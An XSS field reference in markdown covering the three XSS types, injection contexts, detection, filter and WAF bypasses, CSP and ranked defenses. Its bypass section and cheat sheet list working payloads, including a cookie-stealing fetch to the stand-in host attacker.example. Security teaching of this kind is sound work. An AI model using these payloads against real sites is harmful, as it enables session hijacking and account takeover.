# Cross-Site Scripting (XSS) — Notes

Companion reference to [sqli-notes](https://github.com/ZProtons/sqli-notes).
Same idea: not a tutorial, a field reference — what each type actually is,
how to confirm it, and how it's really fixed.

## Table of contents

1. [What XSS is](#1-what-xss-is)
2. [The three types](#2-the-three-types)
3. [Reflected XSS](#3-reflected-xss)
4. [Stored XSS](#4-stored-xss)
5. [DOM-based XSS](#5-dom-based-xss)
6. [Context matters: where your payload lands](#6-context-matters-where-your-payload-lands)
7. [Finding it](#7-finding-it)
8. [Proving it (without being annoying about it)](#8-proving-it-without-being-annoying-about-it)
9. [Filter and WAF bypasses](#9-filter-and-waf-bypasses)
10. [Content-Security-Policy: what it stops, what it doesn't](#10-content-security-policy-what-it-stops-what-it-doesnt)
11. [Cookies, httpOnly, and why XSS is such a big deal](#11-cookies-httponly-and-why-xss-is-such-a-big-deal)
12. [Defenses, ranked](#12-defenses-ranked)
13. [Cheat sheet](#13-cheat-sheet)

---

## 1. What XSS is

XSS is getting the victim's own browser to run JavaScript you wrote, in the
security context of the site they're visiting. It's not injecting into a
database or a shell — it's injecting into a **page**, so it runs with that
page's cookies, session, DOM access, and same-origin privileges.

That's the whole threat model: the attacker never needs to touch the
victim's account directly. The victim's own browser does it for them.

## 2. The three types

| Type | Where the payload lives | Server ever sees it? |
|---|---|---|
| Reflected | In the request (URL, form field) | Yes — reflects it straight back |
| Stored | In the database / storage | Yes — once, then serves it to everyone |
| DOM-based | Entirely client-side (URL fragment, `location`, etc.) | Never |

All three end the same way (arbitrary JS execution), but they differ in
*persistence* and *delivery*, which changes severity and how you find them.

## 3. Reflected XSS

The server takes something from the request and echoes it back into the
HTML response without escaping it, in the same request/response cycle.

```
GET /search?q=<img src=x onerror=alert(document.cookie)>
```

If the page renders `q` unescaped, the image fails to load, `onerror` fires,
and your JS runs. Requires tricking the victim into clicking a crafted link
— it doesn't persist, so there's no "wall" to visit later.

## 4. Stored XSS

The payload gets saved server-side (a comment, a username, a support
ticket, a "display name") and later rendered, unescaped, to other users —
no interaction needed beyond them viewing the normal page. This is why
stored XSS is usually ranked more severe than reflected: one submission,
many victims, no link-clicking required.

Classic targets: comment sections, profile bios, file names, support
tickets an admin will eventually open.

## 5. DOM-based XSS

The vulnerable code runs entirely in the browser — the server's response
never contains the payload at all. A common pattern:

```js
var name = location.hash.slice(1);
document.getElementById("greeting").innerHTML = "Hello, " + name;
```

`location.hash` (everything after `#`) is never sent to the server, so
nothing here shows up in server logs, and a reflected-XSS filter on the
backend does nothing — the vulnerable code is the client-side JS itself.
"Sources" (`location`, `document.referrer`, `postMessage`, `localStorage`)
feeding into "sinks" (`innerHTML`, `document.write`, `eval`) is the pattern
to look for.

## 6. Context matters: where your payload lands

The same `<script>` payload doesn't work everywhere. What you need depends
on where the reflection happens:

| Context | Example sink | What you need |
|---|---|---|
| HTML body | `<div>{{ input }}</div>` | `<script>`, `<img onerror=…>`, any tag |
| HTML attribute | `<input value="{{ input }}">` | Break out of the quote first: `"><script>...` |
| JS string | `var x = "{{ input }}";` | Break out of the string: `";alert(1);//` |
| URL / href | `<a href="{{ input }}">` | `javascript:alert(1)` scheme |
| CSS | `style="color:{{ input }}"` | `expression()` (old IE) or `url()` tricks |

Always check *where* your input lands in the rendered source before
picking a payload — view-source, not just the visible page.

## 7. Finding it

- Throw a harmless, unique marker everywhere input is accepted:
  `xsscanary123` — then view-source and search for it. If it shows up
  un-encoded (`<` stayed `<`, not `&lt;`), that spot is worth testing.
- Check every place state is read back: URL params, form fields, headers
  (`User-Agent`, `Referer`), cookies, file upload names, JSON API responses
  rendered into a page.
- Don't forget DOM-based: grep client-side JS for `innerHTML`,
  `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, and trace
  what feeds them.

## 8. Proving it (without being annoying about it)

`alert(1)` is a cliché for a reason — it's unambiguous and harmless. For
anything you report or write up, that's enough. You don't need to actually
exfiltrate a real cookie to prove impact; describing what *could* be read
(session cookie, CSRF token, page content) is the professional way to
report it.

## 9. Filter and WAF bypasses

Naive filters block specific strings, not the underlying capability:

- Blocks `<script>`? Use an event handler instead: `<img src=x onerror=...>`,
  `<svg onload=...>`, `<body onpageshow=...>`.
- Blocks `onerror`/`onload` as plain text? Try case variation (`OnErRoR`),
  or encode part of the payload (`&#x6f;nerror`).
- Blocks `javascript:`? Try `data:text/html,<script>...`, or whitespace/tab
  tricks inside the scheme (`java\tscript:`).
- Strips `<script>` tags but not nested ones? `<scr<script>ipt>` can
  reassemble after a single-pass strip.
- Space filtered? `/**/`, tabs, or newlines often still work as separators
  inside a tag.

None of these are universal — every filter is different. The discipline is
the same as SQLi filter-bypassing: find exactly what substring/pattern is
being matched, then find the smallest change that still executes but no
longer matches it.

## 10. Content-Security-Policy: what it stops, what it doesn't

A strict CSP (`script-src 'self'`, no `'unsafe-inline'`, no `'unsafe-eval'`)
is the single strongest mitigation — it blocks inline `<script>` and
`onerror=` attributes from executing at all, even if the injection succeeds.

What it does **not** fix:
- A loose policy (`'unsafe-inline'` present, or a wildcard `script-src *`)
  provides close to zero protection.
- JSONP endpoints or old library versions hosted on a whitelisted domain can
  still be abused to execute attacker JS ("CSP bypass via allowed source").
- CSP is a browser-enforced backstop, not a fix for the underlying
  unescaped-output bug. Treat it as defense-in-depth, not the fix itself.

## 11. Cookies, httpOnly, and why XSS is such a big deal

If a session cookie is set without the `HttpOnly` flag, any successful XSS
can read it directly via `document.cookie` and exfiltrate it — full session
hijack, no password needed. `HttpOnly` cookies can't be read by JS at all,
which is why it should be the default for session cookies regardless of
whether you think XSS is possible elsewhere in the app.

`Secure` and `SameSite` matter too, but for a different threat (passive
network sniffing, CSRF) — they don't stop a working XSS from doing damage
inside the page itself: reading the DOM, making authenticated requests,
silently changing account settings as the logged-in user.

## 12. Defenses, ranked

1. **Context-aware output encoding** — escape for the context you're
   rendering into (HTML-entity encode for HTML body, JS-string-escape for
   JS context, URL-encode for URLs). This is the actual fix, not a bonus.
2. **Use a templating engine that auto-escapes by default** (Jinja2, React,
   Vue) — and never deliberately bypass it (`|safe`, `dangerouslySetInnerHTML`,
   `v-html`) on anything touching user input.
3. **Strict CSP** as a second layer, in case something slips through.
4. **HttpOnly + Secure + SameSite on session cookies** — limits the blast
   radius even if XSS happens.
5. **Input validation** — useful for constraining shape (an email field
   shouldn't contain `<`), but never a substitute for output encoding; it's
   the first line of defense, not the last.
6. **Avoid DOM sinks on untrusted data** — don't feed `location`,
   `document.referrer`, or any user-controllable string into `innerHTML` /
   `eval` without sanitizing first (e.g. `DOMPurify` for cases where you
   genuinely need to render user HTML).

## 13. Cheat sheet

```html
<!-- Baseline proof -->
<script>alert(1)</script>

<!-- When <script> is filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>

<!-- Breaking out of an HTML attribute -->
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="

<!-- Breaking out of a JS string context -->
';alert(1);//
</script><script>alert(1)</script>

<!-- javascript: URL scheme -->
javascript:alert(document.domain)

<!-- Cookie theft (what you'd actually send, for a writeup) -->
<img src=x onerror="fetch('https://attacker.example/c?c='+document.cookie)">
```

Related: [sqli-notes](https://github.com/ZProtons/sqli-notes) ·
[recon-playbook](https://github.com/ZProtons/recon-playbook)
